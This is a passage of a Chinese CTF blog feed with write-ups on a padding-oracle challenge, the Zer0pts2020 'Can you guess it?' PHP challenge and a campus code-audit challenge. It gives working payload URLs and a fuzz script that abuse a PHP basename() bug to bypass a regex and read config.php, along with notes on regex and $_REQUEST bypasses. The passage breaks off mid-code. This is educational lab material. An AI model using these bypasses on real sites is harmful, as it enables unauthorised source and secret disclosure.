<p>程序是 <code>128位的cbc</code>，<code>blocksize是16字节</code>，加密 <code>IV</code> 已知，<code>secret</code> 未知<br>但是可以知道解密是否成功，而且可以控制密文和解密的 <code>IV</code><br>可以使用 <code>padding oracle</code> 爆出明文</p>
<p>主要原理是根据 <code>cbc</code> 在 <code>IV padding</code> 正确的情况下的返回值和 <code>padding</code> 错误下的返回值是不一样的，可以利用这个特性逐位还原密文。</p>
<p>找到个<a href="https://github.com/mpgn/Padding-oracle-attack">脚本</a></p>
<p><a href="https://github.com/sqxssss/NPUCTF_WriteUps/blob/master/npuctf_wp_by_star.md">https://github.com/sqxssss/NPUCTF_WriteUps/blob/master/npuctf_wp_by_star.md</a></p>
<p><a href="http://wh1sper.cn/padding-oracle-attackcbc%e5%ad%97%e8%8a%82%e7%bf%bb%e8%bd%ac%e6%94%bb%e5%87%bb/">http://wh1sper.cn/padding-oracle-attackcbc%e5%ad%97%e8%8a%82%e7%bf%bb%e8%bd%ac%e6%94%bb%e5%87%bb/</a></p>
<p><a href="https://www.jianshu.com/p/7f171477a603">https://www.jianshu.com/p/7f171477a603</a></p>
<hr>
<h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="主要说一下几个关键点"><a href="#主要说一下几个关键点" class="headerlink" title="主要说一下几个关键点"></a>主要说一下几个关键点</h2><p><a href="https://www.php.net/manual/zh/function.hash-equals.php">hash_equals 函数</a><br><a href="https://www.php.net/manual/zh/function.crypt.php">crypt 加密函数</a></p>
<p>在密码学中，时序攻击是一种侧信道攻击，攻击者试图通过分析加密算法的时间执行来推导出密码。每一个逻辑运算在计算机需要时间来执行，根据输入不同，精确测量执行时间，根据执行时间反推出密码。</p>
<p>如果是用普通的 <code>==</code> 来进行比较，那么两个字符串是从第一位开始逐一进行比较的，发现不同就立即返回 <code>false</code>，那么通过计算返回的速度就知道了大概是哪一位开始不同的，<code>php</code> 中为了应对这种情况，就使用 <code>hash_equals函数</code>。</p>
<p>示例如下</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>  = <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;114514&#x27;</span>, <span class="string">&#x27;$2a$07$stringforsalt$&#x27;</span>);</span><br><span class="line"><span class="variable">$AAA</span>   = <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;114514&#x27;</span>, <span class="string">&#x27;$2a$07$stringforsalt$&#x27;</span>);</span><br><span class="line"><span class="variable">$BBB</span> = <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;manako&#x27;</span>, <span class="string">&#x27;$2a$07$stringforsalt$&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$test</span>, <span class="variable">$AAA</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$test</span>, <span class="variable">$BBB</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>回显</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span>(<span class="literal">true</span>)</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">true</span>)</span><br></pre></td></tr></table></figure></div>

<p>而将盐值修改为要求的散列类 <code>$2a$07$usesomesillystringforsalt$</code><br>或者去掉bool变量定义，直接将盐值变成 <code>stringforsalt</code> 返回会判定为 <code>false</code></p>
<p>同时看到一句这样的话:</p>
<blockquote>
<p>When the failure string “*0” is given as the salt, “*1” will now be returned for consistency with other crypt implementations. Prior to this version, PHP 5.6 would incorrectly return a DES hash.</p>
</blockquote>
<p>首先来看一下这个加密算法<br><code>crypt</code> 有两个参数：<br>第一个参数：加密字符串<br>第二个参数：盐值字符串 <code>/$str = &#39;123456789&#39;</code>;<br>使用自动盐值 <code>echo&#39;自动 盐值: &#39; . crypt($str) . &quot;\n&quot;; </code><br>如 <code>$1$yvnZHBo0$sBZBd0vzZYnxbtQftQulZ</code></p>
<hr>
<h2 id="以不同散列类型使用-crypt"><a href="#以不同散列类型使用-crypt" class="headerlink" title="以不同散列类型使用 crypt()"></a>以不同散列类型使用 crypt()</h2><h3 id="CRYPT-STD-DES-基于标准-DES-算法的散列使用"><a href="#CRYPT-STD-DES-基于标准-DES-算法的散列使用" class="headerlink" title="CRYPT_STD_DES - 基于标准 DES 算法的散列使用"></a>CRYPT_STD_DES - 基于标准 DES 算法的散列使用</h3><p><code>./0-9A-Za-z</code> 字符中的两个字符作为盐值。<br>在盐值中使用非法的字符将导致 <code>crypt()</code> 失败。</p>
<h3 id="CRYPT-EXT-DES-扩展的基于-DES-算法的散列。"><a href="#CRYPT-EXT-DES-扩展的基于-DES-算法的散列。" class="headerlink" title="CRYPT_EXT_DES - 扩展的基于 DES 算法的散列。"></a>CRYPT_EXT_DES - 扩展的基于 DES 算法的散列。</h3><p>其盐值为 <code>9</code> 个字符的字符串，由 <code>1</code> 个下划线后面跟着 <code>4</code> 字节循环次数和 <code>4</code> 字节盐值组成。<br>它们被编码成可打印字符，每个字符 <code>6</code> 位，有效位最少的优先。<br><code>0</code> 到 <code>63</code> 被编码为 <code>./0-9A-Za-z</code>。</p>
<h3 id="CRYPT-MD5-MD5-散列"><a href="#CRYPT-MD5-MD5-散列" class="headerlink" title="CRYPT_MD5 - MD5 散列"></a>CRYPT_MD5 - MD5 散列</h3><p>使用一个以 <code>$1$</code> 开始的 <code>12</code> 字符的字符串盐值。</p>
<h3 id="CRYPT-BLOWFISH-Blowfish-算法"><a href="#CRYPT-BLOWFISH-Blowfish-算法" class="headerlink" title="CRYPT_BLOWFISH - Blowfish 算法"></a>CRYPT_BLOWFISH - Blowfish 算法</h3><p>使用如下盐值：<code>$2a$</code>，一个两位 <code>cost</code> 参数，<code>$</code> 以及 <code>64</code> 位由 <code>./0-9A-Za-z</code> 中的字符组合而成的字符串。<br>在盐值中使用此范围之外的字符将导致 <code>crypt()</code> 返回一个空字符串。<br>两位 <code>cost</code> 参数是循环次数以 <code>2</code> 为底的对数，它的范围是 <code>04-31</code>，超出这个范围将导致 <code>crypt()</code> 失败。</p>
<p><font color="red">！！！需要注意到一点</font>，盐值要求为 <code>64位</code>，长度不满足就会加密失败，这就是为什么上面的示例使用<code>$2a$07$stringforsalt$</code> 会出现 <code>hash</code> 验证为 <code>true</code>;</p>
<h3 id="CRYPT-SHA256-x2F-SHA512-散列算法"><a href="#CRYPT-SHA256-x2F-SHA512-散列算法" class="headerlink" title="CRYPT_SHA256&#x2F;SHA512 散列算法"></a>CRYPT_SHA256&#x2F;SHA512 散列算法</h3><p><code>SHA-256</code> 算法使用一个以 <code>$5$</code> 开头的 <code>16</code> 字符字符串盐值进行散列<br>如果盐值字符串以 <code>rounds=$</code> 开头，<code>N</code> 的数字值将被用来指定散列循环的执行次数，这点很像 Blowfish 算法的 <code>cost</code> 参数。默认的循环次数是 <code>5000</code>，最小是 <code>1000</code>，最大是 <code>999,999,999</code>。超出这个范围的 <code>N</code> 将会被转换为最接近的值。</p>
<p><code>SHA-256</code> 和 <code>SHA-512</code> 同理</p>
<p>加密示例</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (CRYPT_STD_DES == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Standard DES: &#x27;</span> . <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;rasmuslerdorf&#x27;</span>, <span class="string">&#x27;rl&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_EXT_DES == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Extended DES: &#x27;</span> . <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;rasmuslerdorf&#x27;</span>, <span class="string">&#x27;_J9..rasm&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_MD5 == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;MD5:          &#x27;</span> . <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;rasmuslerdorf&#x27;</span>, <span class="string">&#x27;$1$rasmusle$&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_BLOWFISH == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Blowfish:     &#x27;</span> . <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;rasmuslerdorf&#x27;</span>, <span class="string">&#x27;$2a$07$usesomesillystringforsalt$&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_SHA256 == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;SHA-256:      &#x27;</span> . <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;rasmuslerdorf&#x27;</span>, <span class="string">&#x27;$5$rounds=5000$usesomesillystringforsalt$&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_SHA512 == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;SHA-512:      &#x27;</span> . <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;rasmuslerdorf&#x27;</span>, <span class="string">&#x27;$6$rounds=5000$usesomesillystringforsalt$&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="回归到解题本身"><a href="#回归到解题本身" class="headerlink" title="回归到解题本身"></a>回归到解题本身</h2><h3 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h3><p>比较两个提交的参数是否相等，则给出flag，<code>random_bytes</code>函数生成适合于加密使用的任意长度的加密随机字节字符串，随后通过<code>bin2hex</code>转换为十六进制值</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>)) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//需要将PHP version 更改为&gt;=7</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>)) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>)) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>)) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h3><p>绕过正则表达式访问开头源码提示flag的config.php</p>
<p>需要了解的几个东西 <a href="https://www.php.net/basename">basename函数</a> 以及 <a href="https://bugs.php.net/bug.php?id=62119">函数漏洞</a><br><a href="https://blog.csdn.net/weixin_42314192/article/details/116257437">参考思路，PHP里的basename函数不支持中文名的解决</a></p>
<p>首先先看全局变量 <code>$_SERVER[‘PHP_SELF’]</code> </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[‘PHP_SELF’] 获取当前页面地址</span><br><span class="line">是当前 php 文件相对于网站根目录的位置地址</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//www.test.com/php/ | /php/index.php</span></span><br><span class="line">http:<span class="comment">//www.test.com/php/index.php | /php/index.php</span></span><br><span class="line">http:<span class="comment">//www.test.com/php/index.php?test=yakko | /php/index.php</span></span><br><span class="line">http:<span class="comment">//www.test.com/php/index.php/test/yakko | /php/index.php/test/yakko</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_SERVER</span>[‘REQUEST_URI’]完整url地址，包括请求的url参数</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SERVER</span>[‘HTTP_HOST’]只有一段的域名,不包括前面的协议和后面的相对位置</span><br></pre></td></tr></table></figure></div>

<p>访问 <code>/index.php/config.php</code>，经过 <code>basename()</code> 传入 <code>highlight_file()</code> 的文件名就会变成 <code>config.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$url1</span> = <span class="string">&quot;testpath/index.php&quot;</span>;</span><br><span class="line">     <span class="comment">// 返回index.php</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$url2</span> = <span class="string">&quot;testpath/index.php&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%D1%A7%CF&#x27;</span>); </span><br><span class="line">    <span class="comment">// 返回index.php和乱码</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$url3</span> = <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%D1%A7%CF%B0index.php+ &#x27;</span>);</span><br><span class="line">     <span class="comment">// 返回flag，前面的非acsii被删除</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$url4</span> = <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;index.php%D1%A7%CF%B0 &#x27;</span>); </span><br><span class="line">    <span class="comment">// 返回flag和后面的非ascii</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$url1</span>) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$url2</span>) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$url3</span>) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$url4</span>) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>Payload1</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://xxx.com/index.php/config.php/任意中文?source</span><br></pre></td></tr></table></figure></div>

<p>以及大佬的fuzz思路</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">255</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$str</span>=<span class="string">&quot;/index.php/config.php/&quot;</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">check</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$i</span>.<span class="string">&quot;：&quot;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Payload2</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://xxx.com/index.php/config.php/%80?source</span><br></pre></td></tr></table></figure></div>

<p>参考很多大佬的思路<br><a href="https://blog.csdn.net/qq_58784379/article/details/121742710">sGanYu(Zer0pts2020)basename函数漏洞</a><br><a href="https://blog.csdn.net/rfrder/article/details/110929280">bfengj(Zer0pts2020)Can you guess it?的WP</a></p>
<hr>
<h1 id="叨逼几句"><a href="#叨逼几句" class="headerlink" title="叨逼几句"></a>叨逼几句</h1><p>很久没做题了，摸了太久了，的确自己生疏了很多，2021年确实很多事情不怎么顺，希望新的一年能好一些吧</p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>贴贴校赛代码审计题的总结学习</title>
    <url>/yakko117/2019/09/26/ccsu_codeaudit/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="Code-Easy-Audit"><a href="#Code-Easy-Audit" class="headerlink" title="Code_Easy_Audit"></a>Code_Easy_Audit</h1><p>首先看源码吧</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Null          ...            Null            ...            Null          ...  &quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>, <span class="literal">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span><span class="title function_ invoke__"> </span>(<span class="variable">$_REQUEST as</span> <span class="variable">$key </span>=&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))   <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/cyber|flag|ciscn/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))  <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack..&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cyber&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cyber&#x27;</span>], <span class="number">32</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cyber&#x27;</span>])))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack...&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^ciscnsec$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;ciscn&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ciscn&#x27;</span>] !== <span class="string">&#x27;ciscnsec&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$getflag </span>= <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack....&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$getflag</span>) &amp;&amp; <span class="variable">$getflag </span>=== <span class="string">&#x27;security&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span><span class="title function_ invoke__"> die</span>(<span class="string">&#x27;Hello Hack.....&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这题考几个点：</p>
<ol>
<li><code>$_REQUEST</code> 的变量覆盖</li>
<li>编码绕过</li>
<li>PHP数组特性</li>
<li>正则绕过</li>
<li><code>file_get_contents</code> 函数</li>
</ol>
<hr>
<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span><span class="title function_ invoke__"> </span>(<span class="variable">$_REQUEST as</span> <span class="variable">$key </span>=&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))   <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p> 上述代码把 <code>$_GET</code>, <code>$_POST</code>, <code>$_COOKIE</code>传进来的值进行了正则匹配，如果包含了<code>A-Z</code> 和 <code>a-z</code>的字母就被waf</p>
<p>这里的 <code>$_REQUEST</code>有一个特性，就是当 <code>GET</code> 和 <code>POST</code> 都存在同一个变量名的时候，只获取 <code>POST</code> 中的值，所以可以通过这个特性来绕过正则的匹配</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g7d7qdve9vj31570g240l.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g7d7qdve9vj31570g240l.jpg" class="lazyload"></a></p>
<p>当POST中也有个变量的时候，abc就会输出，否则就输出waf</p>
<hr>
<p>接着往下分析</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/cyber|flag|ciscn/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))  <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack..&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>关于 <code>$_SERVER[&#39;QUERY_STRING&#39;]</code> 获取的值，就是get中变量名和内容</p>
<p>详细资料可以参考<a href="https://blog.csdn.net/fjb2080/article/details/80548431">一篇CSDN详解</a><br>这个绕过思路就是 <code>URL编码</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g7d7qdvcfwj30z70mf411.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g7d7qdvcfwj30z70mf411.jpg" class="lazyload"></a></p>
<hr>
<p>然后就是下面的代码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cyber&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cyber&#x27;</span>], <span class="number">32</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cyber&#x27;</span>])))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack...&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^ciscnsec$/&#x27;</span>, <span class="variable">$_GET</span>[<span 